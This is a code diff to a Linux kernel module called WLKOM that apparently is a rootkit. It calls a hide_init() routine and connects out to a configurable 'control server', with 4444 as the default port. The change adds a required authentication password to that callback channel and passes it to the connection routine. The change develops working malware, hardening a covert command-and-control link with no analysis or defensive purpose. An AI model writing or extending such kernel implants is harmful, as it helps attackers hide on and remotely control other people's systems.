@@ -13,14 +13,19 @@ MODULE_AUTHOR("WLKOM Team");
 MODULE_DESCRIPTION("Wild Linux Kernel Object Module");
 MODULE_VERSION(WLKOM_VERSION);
 
-static char control_ip[64] = "127.0.0.1";
-static int  control_port   = 4444;
+static char control_ip[64]       = "127.0.0.1";
+static int  control_port         = 4444;
+static char control_password[128] = "";
 
 module_param_string(control_ip, control_ip, sizeof(control_ip), 0644);
 MODULE_PARM_DESC(control_ip, "Control server IP address");
 
 module_param(control_port, int, 0644);
 MODULE_PARM_DESC(control_port, "Control server port");
+
+module_param_string(control_password, control_password,
+                    sizeof(control_password), 0400);
+MODULE_PARM_DESC(control_password, "Authentication password");
 
 /**
  * @brief Module entry point.
@@ -36,6 +41,11 @@ static int __init wlkom_init(void)
 
     pr_info("WLKOM: module loading...\n");
     pr_info("WLKOM: control %s:%d\n", control_ip, control_port);
+    if (control_password[0] == '\0')
+    {
+        pr_err("WLKOM: no password provided (use control_password=...)\n");
+        return -EINVAL;
+    }
 
     ret = hide_init();
     if (ret < 0)
@@ -53,7 +63,7 @@ static int __init wlkom_init(void)
         return ret;
     }
 
-    ret = connect_init(control_ip, control_port);
+    ret = connect_init(control_ip, control_port, control_password);
     if (ret < 0)
     {
         pr_err("WLKOM: connect_init failed\n");
